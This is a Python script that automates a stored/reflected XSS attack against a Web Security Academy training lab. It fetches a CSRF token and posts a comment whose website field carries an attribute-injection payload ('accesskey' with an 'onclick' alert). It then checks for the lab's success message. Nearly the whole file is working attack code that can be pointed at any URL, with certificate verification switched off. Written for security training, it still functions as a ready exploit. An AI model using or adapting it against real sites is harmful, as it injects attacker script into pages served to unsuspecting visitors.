#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter
from bs4 import BeautifulSoup

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%27accesskey=%27x%27onclick=%27alert(1)" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%27accesskey=%27x%27onclick=%27alert(1)" 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: %27accesskey=%27x%27onclick=%27alert(1)', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def xss(url, command, csrf, path):
    comm_path = '/post/comment'
    data = {
        'csrf': csrf,
        'postId': 1,
        'comment': 'test',
        'name': 'author',
        'email': 'test@test.com',
        'website': url + "/?" + command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(url + comm_path, data=data, verify=False, proxies=proxies)
    else:
        s.post(url + comm_path, data=data, verify=False)
        r = s.get(url + path, verify=False)
        # verify the response contains Congratulations, you solved the lab!
        if (b'Congratulations, you solved the lab!' in r.content):
            print("(+) Reflected XSS Successful!")
            subprocess.call(["google-chrome-stable", url])
        else:
            print("(-) Reflected XSS Failed")

def get_csrf(s, url):
    global csrf, path, headers
    path = '/post?postId=1'
    r = s.get(url + path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf, path

def main():
    
    print("(+) Exploiting Reflected XSS")

    get_csrf(s, url)
        
    xss(url, command, csrf, path)

if __name__ == "__main__":
    main()
